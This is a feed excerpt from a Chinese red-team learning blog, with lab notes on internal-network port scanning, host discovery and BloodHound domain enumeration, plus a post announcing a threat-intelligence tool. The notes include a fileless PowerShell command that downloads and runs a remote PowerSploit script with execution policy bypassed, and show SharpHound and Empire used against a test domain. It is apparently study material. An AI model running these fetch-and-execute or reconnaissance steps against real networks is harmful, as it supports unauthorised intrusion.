aliveicmp alive hosts len is: 1192.168.7.7:445 open[+] 192.168.7.7 MS17-010        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)scan end</code></pre><h2 id="4、ScanLine"><a href="#4、ScanLine" class="headerlink" title="4、ScanLine"></a>4、ScanLine</h2><p>McAfee 出品的一款经典的端口扫描工具，ScanLine 项目地址：<a href="www.mcafee.com/us/downloads/free-tools/termsofuse.aspx">www.mcafee.com/us/downloads/free-tools/termsofuse.aspx</a></p><p>但是项目地址的下载按钮貌似失效了，其他的下载地址：<a href="https://www.lanzous.com/i32zncf">https://www.lanzous.com/i32zncf</a></p><pre><code>scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7</code></pre><pre><code>C:\Users\daniel10&gt;scanline.exe -h -t 22,80,445,3389 -p 192.168.7.7ScanLine (TM) 1.01Copyright (c) Foundstone, Inc. 2002http://www.foundstone.comScan of 1 IP started at Wed Feb 24 21:31:11 2021-------------------------------------------------------------------------------192.168.7.7Responds with ICMP unreachable: NoTCP ports: 445 3389-------------------------------------------------------------------------------Scan finished at Wed Feb 24 21:31:15 20211 IP and 4 ports scanned in 0 hours 0 mins 4.03 secs</code></pre><h2 id="5、S-扫描器"><a href="#5、S-扫描器" class="headerlink" title="5、S 扫描器"></a>5、S 扫描器</h2><p>S 扫描器支持大网段扫描，扫描速度也很快，是比较早期的一款扫描工具了，比较适合运行在 Windows Server 2003 以下版本的操作系统中，下载地址：<a href="https://pan.baidu.com/s/1gdGM4F5">https://pan.baidu.com/s/1gdGM4F5</a></p><blockquote><p>值得提一句的是在我下载该工具到本地后，火绒立马给它删了，而其他的扫描工具火绒都没告警。</p></blockquote><pre><code>s.exe tcp 192.168.7.7 22,80,443,445 7</code></pre><pre><code>C:\Users\daniel10&gt;s.exe tcp 192.168.7.7 22,80,443,445 7TCP Port Scanner V1.1 By WinEggDropNormal Scan: About To Scan 4 Ports Using 7 Thread192.168.7.7      445   OpenScan 192.168.7.7 Complete In 0 Hours 0 Minutes 3 Seconds. Found 1 Open Ports</code></pre><h2 id="6、PowerShell-脚本"><a href="#6、PowerShell-脚本" class="headerlink" title="6、PowerShell 脚本"></a>6、PowerShell 脚本</h2><h3 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h3><p>PowerSploit 的 Invoke-Portscan 脚本下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1</a></p><p>无文件形式（推荐）</p><pre><code>powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#39;);Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;</code></pre><blockquote><p>如果报错，估计是网络的问题</p></blockquote><p>有文件形式</p><pre><code>powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;</code></pre><pre><code>C:\Users\daniel10&gt;powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-Portscan.ps1;Invoke-Portscan -Hosts 192.168.7.7 -T 4 -ports &#39;445,1433,80,8080,3389&#39;&quot;Hostname      : 192.168.7.7alive         : TrueopenPorts     : &#123;445, 3389&#125;closedPorts   : &#123;8080, 80, 1433&#125;filteredPorts : &#123;&#125;finishTime    : 2021/2/24 下午 21:14:06</code></pre><h3 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h3><p>nishang 的 Invoke-Portscan 脚本下载地址：<a href="https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1">https://raw.githubusercontent.com/samratashok/nishang/0090ba2e51b7503c3245081894c0fc87b696f941/Scan/Invoke-PortScan.ps1</a></p><pre><code> Invoke-PortScan -StartAddress 192.168.7.7 -EndAddress 192.168.7.7 -ScanPort -Port 80,443,445</code></pre><pre><code>PS C:\Users\daniel10&gt; Import-Module .\Invoke-Portscan.ps1PS C:\Users\daniel10&gt; Invoke-PortScan -StartAddress 192.168.7.7 -EndAddress 192.168.7.7 -ScanPort -Port 80,443,445IPAddress   HostName Ports---------   -------- -----192.168.7.7          &#123;445&#125;</code></pre><h2 id="7、MSF"><a href="#7、MSF" class="headerlink" title="7、MSF"></a>7、MSF</h2><p>万能的 MSF 自然也是能够进行端口探测的，MSF 中用于端口探测的模块有：</p><pre><code>auxiliary/scanner/portscan/ack          TCP ACK端口扫描auxiliary/scanner/portscan/ftpbounce    FTP bounce端口扫描auxiliary/scanner/portscan/syn             SYN端口扫描auxiliary/scanner/portscan/tcp          TCP端口扫描  auxiliary/scanner/portscan/xmas         TCP XMas端口扫描……</code></pre><p>除了上述工具外，还有 nmap、masscan 什么的就不多说了，读者如果感兴趣可以自行尝试玩玩。</p><blockquote><p>参考文章：</p><p><a href="https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/">https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;注：本文中的工具均来源自互联网，后门自查。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在进入目标域后，对域内存活主机进行端口探测是经常要做的一步，在此记录一些常见的方法。&lt;/p&gt;
&lt;h2 id=&quot;1、Telnet&quot;&gt;&lt;a href=&quot;#1、Teln</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>【工具分享】写了一个威胁情报收集的小工具</title>
    <link href="https://www.teamssix.com/year/210315-133209.html"/>
    <id>https://www.teamssix.com/year/210315-133209.html</id>
    <published>2021-03-15T05:32:09.000Z</published>
    <updated>2021-03-15T05:43:04.398Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>tig <code>Threat Intelligence Gathering</code> 威胁情报收集，旨在提高蓝队拿到攻击 IP 后对其进行威胁情报信息收集的效率，目前已集成微步、IP 域名反查、Fofa 信息收集、ICP 备案查询、IP 存活检测五个模块，现已支持以下信息的查询：</p><ul><li>✅ 微步标签</li><li>✅ IP 域名反查</li><li>✅ ICP 备案查询</li><li>✅ IP 存活检测</li><li>✅ 开放端口查询</li><li>……</li></ul><p>后续将集成更多模块，如有好的建议或遇到 Bug 欢迎与我反馈，我的微信号：teamssix_com</p><p>工具地址：<a href="https://github.com/wgpsec/tig">https://github.com/wgpsec/tig</a>，或点击查看原文链接进行打开</p><p>如果感觉工具还行，欢迎各位师傅赏个 star</p><h1 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h1><p>需要 python3 环境支持</p><pre><code>pip3 install -r requirements.txtpython3 tig.py</code></pre><h1 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h1><p>工具命令如下：</p><pre><code>-h, --help  查看帮助信息-c CONFIG   指定配置文件，默认 ./config.ini-f FILE     IP 文本，一行一个-i IP       目标 IP-p PROXY    指定代理，比如：http://127.0.0.1:1080 或者 socks5://127.0.0.1:1080</code></pre><p>在开始使用工具之前，需要对配置文件进行配置，默认配置文件如下：</p><pre><code>[Threat Intelligence]# 微步威胁情报查询，查看 api 地址：https://x.threatbook.cn/nodev4/vb4/myAPI（每天 50 次的免费额度）ThreatBook_enable = trueThreatBook_api = &#39;&#39;[IP Passive Information]# IP 反查，调用 http://api.hackertarget.com/reverseiplookup/ 的 api，每个 IP 限制每天 100 次免费查询IP_reverse_enable = true# ICP 备案信息查询，调用 https://api.vvhan.com/api/icp 的 api，如果目标 IP 没有反查到域名，该项即使开启也不会有输出ICP_beian_enable = true# Fofa ip 信息查询，查看 api 地址：https://fofa.so/user/users/detail（付费，普通会员每次100条，高级会员每次10000条）Fofa_enable = trueFofa_email = &#39;&#39;Fofa_api = &#39;&#39;[IP Active Information]# 利用 ping 命令对 IP 进行存活检测IP_survive_enable = true</code></pre><p>在配置文件里添加自己的微步 API 和 Fofa API 才可使用相关模块，添加 API 后，就可以正常使用相关模块了。</p><p>例如这里获取某个 IP 的信息，直接使用 -i 命令即可，如果想使用代理可以使用 -p 命令。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-03-15_13-03-47.png"></p><h1 id="0x03-最后"><a href="#0x03-最后" class="headerlink" title="0x03 最后"></a>0x03 最后</h1><p>如果在工具使用的过程中发现存在 bug 等问题，欢迎与我反馈，我的微信号：teamssix_com，同时也欢迎关注我的个人微信公众号：TeamsSix</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-介绍&quot;&gt;&lt;a href=&quot;#0x00-介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 介绍&quot;&gt;&lt;/a&gt;0x00 介绍&lt;/h1&gt;&lt;p&gt;tig &lt;code&gt;Threat Intelligence Gathering&lt;/code&gt; 威胁情</summary>
      
    
    
    
    <category term="工具分享" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="Python" scheme="https://www.teamssix.com/tags/Python/"/>
    
    <category term="蓝队" scheme="https://www.teamssix.com/tags/%E8%93%9D%E9%98%9F/"/>
    
    <category term="威胁情报" scheme="https://www.teamssix.com/tags/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】5、BloodHound 的使用</title>
    <link href="https://www.teamssix.com/year/210226-190853.html"/>
    <id>https://www.teamssix.com/year/210226-190853.html</id>
    <published>2021-02-26T11:08:53.000Z</published>
    <updated>2021-02-26T10:10:32.704Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>BloodHound 使用可视化图形显示域环境中的关系，攻击者可以使用 BloodHound 识别高度复杂的攻击路径，防御者可以使用 BloodHound 来识别和防御那些相同的攻击路径。蓝队和红队都可以使用 BloodHound 轻松深入域环境中的权限关系。</p><p>BloodHound 通过在域内导出相关信息，在将数据收集后，将其导入Neo4j 数据库中，进行展示分析。因此在安装 BloodHound 时，需要安装 Neo4j 数据库。</p><h2 id="2、安装"><a href="#2、安装" class="headerlink" title="2、安装"></a>2、安装</h2><p>因为 Neo4j 数据库需要 Java 支持，因此安装 BloodHound 需要先安装 Java，这里以 Windows 系统下的安装为例。</p><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>JDK 需要下载最新版本，不然 Neo4j 运行可能会报错，JDK 下载地址：<a href="https://www.oracle.com/java/technologies/javase-downloads.html">https://www.oracle.com/java/technologies/javase-downloads.html</a>，下载之后，直接安装即可。</p><h3 id="Neo4j"><a href="#Neo4j" class="headerlink" title="Neo4j"></a>Neo4j</h3><p>Neo4j 直接下载最新版本，下载地址：<a href="https://neo4j.com/download-center/#community">https://neo4j.com/download-center/#community</a></p><p>下载最新版本之后解压下载文件，打开 bin 目录，执行命令<code>neo4j.bat console</code>，之后打开浏览器访问 <a href="http://localhost:7474/">http://localhost:7474</a> 登陆后台，输入以下信息连接到数据库说明安装就完成了。</p><pre><code>URL：neo4j://localhost:7687用户名(默认)：neo4j密码(默认)：neo4j</code></pre><h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>BloodHound 项目地址：<a href="https://github.com/BloodHoundAD/BloodHound">https://github.com/BloodHoundAD/BloodHound</a>，下载后解压打开 BloodHound.exe，输入 Neo4j 数据库的账号密码即可完成安装。</p><h2 id="3、使用"><a href="#3、使用" class="headerlink" title="3、使用"></a>3、使用</h2><p>安装完成 BloodHound 后，需要进行数据的采集与导入，数据的采集可以使用 ps1 脚本或者使用 exe 程序收集，工具下载地址：<a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors</a></p><p>这里使用 SharpHound.exe 进行数据的采集，将 SharpHound.exe 拷贝到目标上，执行 <code>SharpHound.exe -c all</code> 进行数据采集。</p><pre><code>C:\Users\daniel10&gt;SharpHound.exe -c all---------------------------------------------Initializing SharpHound at 22:36 on 2021/2/25---------------------------------------------Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container[+] Creating Schema map for domain TEAMSSIX.COM using path CN=Schema,CN=Configuration,DC=teamssix,DC=com[+] Cache File Found! Loaded 1332 Objects in cache[+] Pre-populating Domain Controller SIDSStatus: 0 objects finished (+0) -- Using 24 MB RAMStatus: 673 objects finished (+673 134.6)/s -- Using 43 MB RAMEnumeration finished in 00:00:05.3136324Compressing data to .\20210225223622_BloodHound.zipYou can upload this file directly to the UISharpHound Enumeration Completed at 22:36 on 2021/2/25! Happy Graphing!</code></pre><p>如果使用 ps1 脚本收集，命令为：</p><pre><code>powershell -exec bypass -command &quot;Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all&quot;</code></pre><p>采集到的数据会以 zip 压缩包的格式保存，将其拷贝到 BloodHound 所在主机上，在 BloodHound 右侧图标里点击 Upload Data，之后上传刚才生成的压缩包就可以导入数据了。</p><blockquote><p>或者直接将 zip 压缩包拖拽到 BloodHound 里也可以导入数据。</p></blockquote><p>在 BloodHound 右上角有三个板块：</p><p>1、Database Info（数据库信息），可以查看当前数据库中的域用户、域计算机等统计信息。</p><p>2、Node Indo（节点信息），单击某个节点时，在这里可以看到对应节点的相关信息。</p><p>3、Analysis（分析查询），在 BloodHound 中预设了一些查询条件，具体如下：</p><pre><code>1、查询所有域管理员2、寻找到域管理员的最短路径3、查找具有DCSync权限的主体4、具有外部域组成员资格的用户5、具有外部域名组成员资格的组6、映射域信任7、到无约束委托系统的最短路径8、到达Kerberoastable用户的最短路径9、从Kerberoastable用户到域管理员的最短路径10、拥有的主体的最短路径11、从拥有的主体到域管理员的最短路径12、到高价值目标的最短路径13、查找域用户是本地管理员的计算机14、查找域用户可以读取密码的计算机15、从域用户到高价值目标的最短路径16、找到从域用户到高价值目标的所有路径17、找到域用户可以RDP的工作站18、找到域用户可以RDP的服务器19、查找域用户组的危险权限20、找到高价值群体中能够支持kerberoable的成员21、列出所有kerberoable用户22、查找具有大多数特权的Kerberoastable用户23、查找到非域控制器的域管理登录24、查找不支持操作系统的计算机25、查找AS-REP Roastable用户(DontReqPreAuth)</code></pre><p>比如这里查询到域管理员的最短路径</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-25_14-00-42.png"></p><blockquote><p>路径由粗到细表示xx对xx有权限或关系</p></blockquote><p>总的来说感觉 BloodHound 还是挺有意思的，可以很直观的看到域内主机间的关系。不过毕竟是辅助工具，还是需要不断提升自己的实力、经验才能更好的去分析这样的一个结果才是。</p><blockquote><p>参考链接：</p><p><a href="https://xz.aliyun.com/t/7311">https://xz.aliyun.com/t/7311</a></p><p><a href="https://www.freebuf.com/sectool/179002.html">https://www.freebuf.com/sectool/179002.html</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;BloodHound 使用可视化图形显示域环境中的关系，攻击者可以使用 BloodHound 识别高度复杂的攻击路径，防御者</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】域内主机存活探测的一些方法总结</title>
    <link href="https://www.teamssix.com/year/210224-210909.html"/>
    <id>https://www.teamssix.com/year/210224-210909.html</id>
    <published>2021-02-24T13:09:09.000Z</published>
    <updated>2021-06-08T07:10:54.722Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>注：本文中的工具均来源自互联网，后门自查。</p></blockquote><p>在进入目标域后，对域内主机进行存活探测是不可或缺的一步，在此记录一下亿些常见的方法。</p><h2 id="1、ping"><a href="#1、ping" class="headerlink" title="1、ping"></a>1、ping</h2><p>使用 ping 进行检测的优点是不容易触发检测规则，缺点是速度较慢，如果目标开启了禁止 ping 的策略，那这个方法就 gg 了。</p><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><pre><code>for /l %i in (1,1,255) do @ping 192.168.7.%i -w 1 -n 1|find /i &quot;ttl=&quot;</code></pre><pre><code>C:\Users\daniel10&gt;for /l %i in (1,1,255) do @ping 192.168.7.%i -w 1 -n 1|find /i &quot;ttl=&quot;来自 192.168.7.7 的回复: 字节=32 时间&lt;1ms TTL=128来自 192.168.7.107 的回复: 字节=32 时间=1ms TTL=64来自 192.168.7.110 的回复: 字节=32 时间&lt;1ms TTL=128</code></pre><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><pre><code>for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done</code></pre><pre><code>teamssix@localhost:~#  for k in $( seq 1 255);do ping -c 1 192.168.7.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done192.168.7.7192.168.7.107192.168.7.110</code></pre><h3 id="VBS"><a href="#VBS" class="headerlink" title="VBS"></a>VBS</h3><pre><code>strSubNet = &quot;192.168.7.&quot;  Set objFSO= CreateObject(&quot;Scripting.FileSystemObject&quot;)  Set objTS = objfso.CreateTextFile(&quot;C:\Result.txt&quot;)   For i = 1 To 254  strComputer = strSubNet &amp; i  blnResult = Ping(strComputer)  If blnResult = True Then  objTS.WriteLine strComputer &amp; &quot; is alived ! :) &quot;  End If  Next   objTS.Close  WScript.Echo &quot;All Ping Scan , All Done ! :) &quot;    Function Ping(strComputer)  Set objWMIService = GetObject(&quot;winmgmts:\\.\root\cimv2&quot;) Set colItems = objWMIService.ExecQuery(&quot;Select * From Win32_PingStatus Where Address=&#39;&quot; &amp; strComputer &amp; &quot;&#39;&quot;) For Each objItem In colItems  Select case objItem.StatusCode  Case 0  Ping = True  Case Else  Ping = False  End select  Exit For  Next  End Function</code></pre><h2 id="2、PowerShell"><a href="#2、PowerShell" class="headerlink" title="2、PowerShell"></a>2、PowerShell</h2><h3 id="TSPingSweep"><a href="#TSPingSweep" class="headerlink" title="TSPingSweep"></a>TSPingSweep</h3><p>PowerShell TSPingSweep 扫描脚本下载地址：</p><p><a href="https://raw.githubusercontent.com/dwj7738/My-Powershell-Repository/master/Scripts/Invoke-TSPingSweep.ps1">https://raw.githubusercontent.com/dwj7738/My-Powershell-Repository/master/Scripts/Invoke-TSPingSweep.ps1</a></p><pre><code>powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 192.168.7.1 -EndAddress 192.168.7.254 -ResolveHost -ScanPort -Port 445,135&quot;</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-23_21-02-52.png"></p><pre><code>C:\Users\daniel10&gt;powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress 192.168.7.1 -EndAddress 192.168.7.254 -ResolveHost -ScanPort -Port 445,135&quot;IPAddress     HostName             Ports---------     --------             -----192.168.7.7   dc.teamssix.com      &#123;445, 135&#125;192.168.7.107 DANIEL7.teamssix.com &#123;445, 135&#125;192.168.7.110 daniel10.teamssix... &#123;445, 135&#125;</code></pre><h3 id="ARPScan"><a href="#ARPScan" class="headerlink" title="ARPScan"></a>ARPScan</h3><p>PowerShell ARPScan 扫描脚本下载地址：<a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1</a></p><pre><code>powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.7.0/24&quot;</code></pre><pre><code>C:\Users\daniel10&gt;powershell.exe -exec bypass -Command &quot;Import-Module ./Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.7.0/24&quot;MAC               Address---               -------16:7D:DA:D7:8F:64 192.168.7.100:0C:29:1D:82:CF 192.168.7.700:0C:29:A9:62:98 192.168.7.10700:0C:29:DC:01:0D 192.168.7.11000:0C:29:DC:01:0D 192.168.7.255</code></pre><h2 id="3、arp-scan"><a href="#3、arp-scan" class="headerlink" title="3、arp-scan"></a>3、arp-scan</h2><p>arp-scan 使用 ARP 协议进行探测。arp-scan Windows 下载地址：<a href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a></p><pre><code>C:\Users\daniel10&gt;arp-scan.exe -t 192.168.7.0/24Reply that 16:7D:DA:D7:8F:64 is 192.168.7.1 in 11.278300Reply that 00:0C:29:1D:82:CF is 192.168.7.7 in 16.140500Reply that 00:0C:29:A9:62:98 is 192.168.7.107 in 15.233500Reply that 00:0C:29:DC:01:0D is 192.168.7.110 in 0.080700Reply that 00:0C:29:DC:01:0D is 192.168.7.255 in 0.071500</code></pre><h2 id="4、arp-ping"><a href="#4、arp-ping" class="headerlink" title="4、arp-ping"></a>4、arp-ping</h2><p>Arp-ping 基于 arp 协议，它可以 “ping” 受防火墙保护的主机，下载地址：<a href="https://www.elifulkerson.com/projects/arp-ping.php">https://www.elifulkerson.com/projects/arp-ping.php</a></p><p>由于 arp-ping 只能一次 ping 一台主机，但在测试过程中肯定不能一台一台的 ping ，所以这里参考上面的 ping 脚本写了一个 arp-ping 循环 ping 主机的脚本。</p><pre><code>for /l %i in (1,1,255) do @arp-ping.exe 192.168.7.%i -w 1 -n 1|find /i &quot;Reply&quot;</code></pre><pre><code>C:\Users\daniel10&gt;for /l %i in (1,1,255) do @arp-ping.exe 192.168.7.%i -w 1 -n 1|find /i &quot;Reply&quot;Reply that 16:7D:DA:D7:8F:64 is 192.168.7.1 in 2.233msReply that 00:0C:29:A9:62:98 is 192.168.7.107 in 16.857msReply that 00:0C:29:DC:01:0D is 192.168.7.110 in 0.205msReply that 00:0C:29:DC:01:0D is 192.168.7.255 in 0.200ms</code></pre><h2 id="5、Empire"><a href="#5、Empire" class="headerlink" title="5、Empire"></a>5、Empire</h2><p>Empire 内置了arpscan 模块，该模块可利用 arp 协议对内网主机进行探测。将目标主机上线 Empire 后，使用 powershell/situational_awareness/network/arpscan 模块，设置扫描范围即可，具体如下：</p><pre><code>(Empire: listeners) &gt; agents[*] Active agents: Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen ----     -- -----------     ------------      --------                -------            ---    -----    --------- APDGSW9X ps 192.168.7.7     DC                *TEAMSSIX\administrator powershell         3648   5/0.0    2021-02-23 20:43:27(Empire: agents) &gt; usemodule powershell/situational_awareness/network/arpscan(Empire: powershell/situational_awareness/network/arpscan) &gt; set Agent APDGSW9X(Empire: powershell/situational_awareness/network/arpscan) &gt; set CIDR 192.168.7.0/24(Empire: powershell/situational_awareness/network/arpscan) &gt; executeMAC               Address      ---               -------      16:7D:DA:D7:8F:64 192.168.7.1  00:0C:29:1D:82:CF 192.168.7.7  00:0C:29:A9:62:98 192.168.7.10700:0C:29:DC:01:0D 192.168.7.11000:0C:29:1D:82:CF 192.168.7.255</code></pre><h2 id="6、nbtscan"><a href="#6、nbtscan" class="headerlink" title="6、nbtscan"></a>6、nbtscan</h2><p>nbtscan 有 Windows 和 Linux 两个版本，使用 netbios 协议扫描本地或远程 TCP/IP 网络上的开放 NetBIOS 名称服务器。</p><p>nbtscan 下载地址：<a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p><pre><code>C:\Users\daniel10&gt;nbtscan.exe 192.168.7.0/24192.168.7.1     \DP192.168.7.7     TEAMSSIX\DC                     SHARING DC192.168.7.107   TEAMSSIX\DANIEL7                SHARING*timeout (normal end of scan)</code></pre><h2 id="7、unicornscan"><a href="#7、unicornscan" class="headerlink" title="7、unicornscan"></a>7、unicornscan</h2><p>unicornscan 使用 UDP 协议，在 kali 下可以直接 apt-get 进行安装，这个使用起来感觉有点慢。</p><pre><code>teamssix@localhost:~# unicornscan -mU 192.168.7.7UDP open              domain[   53]        from 192.168.7.7  ttl 127teamssix@localhost:~# for k in $( seq 1 255);do unicornscan -mU 192.168.7.$k|grep &quot;open&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $5&#125;&#39;; done192.168.7.1192.168.7.7192.168.7.107</code></pre><h2 id="8、scanline"><a href="#8、scanline" class="headerlink" title="8、scanline"></a>8、scanline</h2><p>McAfee 出品，推荐 win 下使用（管理员执行），scanline 项目地址：<a href="www.mcafee.com/us/downloads/free-tools/termsofuse.aspx">www.mcafee.com/us/downloads/free-tools/termsofuse.aspx</a></p><p>但是项目地址的下载按钮貌似失效，其他的下载地址：<a href="https://www.lanzous.com/i32zncf">https://www.lanzous.com/i32zncf</a></p><pre><code>C:\Users\daniel10&gt;scanline.exe -n 192.168.7.0-255ScanLine (TM) 1.01Copyright (c) Foundstone, Inc. 2002http://www.foundstone.comScan of 256 IPs started at Tue Feb 23 22:07:40 2021-------------------------------------------------------------------------------192.168.7.7Responded in 0 ms.0 hops awayResponds with ICMP unreachable: No-------------------------------------------------------------------------------192.168.7.107Responded in 0 ms.0 hops awayResponds with ICMP unreachable: No-------------------------------------------------------------------------------192.168.7.110Responded in 0 ms.0 hops awayResponds with ICMP unreachable: No-------------------------------------------------------------------------------Scan finished at Tue Feb 23 22:07:49 20213 IPs and 0 ports scanned in 0 hours 0 mins 9.16 secs</code></pre><h2 id="9、telnet"><a href="#9、telnet" class="headerlink" title="9、telnet"></a>9、telnet</h2><p>通过 telnet 探测 445 端口或者其他端口判断主机存活。</p><pre><code>for /l %a in (1,1,254) do start /min /low telnet 192.168.7.%a 445</code></pre><h2 id="10、tcping"><a href="#10、tcping" class="headerlink" title="10、tcping"></a>10、tcping</h2><p>tcping.exe 是一个命令行程序，其操作类似于“ping”，但它通过 TCP 工作，下载地址：<a href="https://elifulkerson.com/projects/tcping.php">https://elifulkerson.com/projects/tcping.php</a></p><pre><code>C:\Users\daniel10&gt;tcping.exe -n 1 192.168.7.7 445Probing 192.168.7.7:445/tcp - Port is open - time=1.719msPing statistics for 192.168.7.7:445     1 probes sent.     1 successful, 0 failed.  (0.00% fail)Approximate trip times in milli-seconds:     Minimum = 1.719ms, Maximum = 1.719ms, Average = 1.719ms</code></pre><h2 id="11、cping"><a href="#11、cping" class="headerlink" title="11、cping"></a>11、cping</h2><p>k8 团队出品，下载地址：<a href="https://www.lanzous.com/i3837ne#Window">https://www.lanzous.com/i3837ne#Window</a></p><p>下载解压后可以看到很多个 exe 文件，其分别代表了.net 编译版本，编译版本对应系统如下：</p><pre><code>XP/2003(已淘汰,用户少,使用的大部分也会装.net,因为好多app需要连驱动都要.net,具体看安装版本一般2.0)Vista       2.0(基本上也没多少用户)Win7/2008   2.0 3.0 3.5Win8/2012   4.0Win8.1      4.0 4.5Win10/2016  4.0 4.6 (4.5未测应该也行)</code></pre><pre><code>C:\Users\daniel10&gt;cping40.exe scan osver 192.168.7.1 192.168.7.255Scan OS version192.168.7.1---192.168.7.255Segment: 192.168.7.0=============================================IP              MAC               HostName        OSver192.168.7.7     00-0C-29-1D-82-CF dc.teamssix.com [Win 2008 R2 Datacenter 7601 SP 1]192.168.7.110   00-0C-29-DC-01-0D daniel10.teamssix.com []192.168.7.107   00-0C-29-A9-62-98 daniel7.teamssix.com [Win 7 Professional 7601 SP 1]=============================================Count:3</code></pre><h2 id="12、fscan"><a href="#12、fscan" class="headerlink" 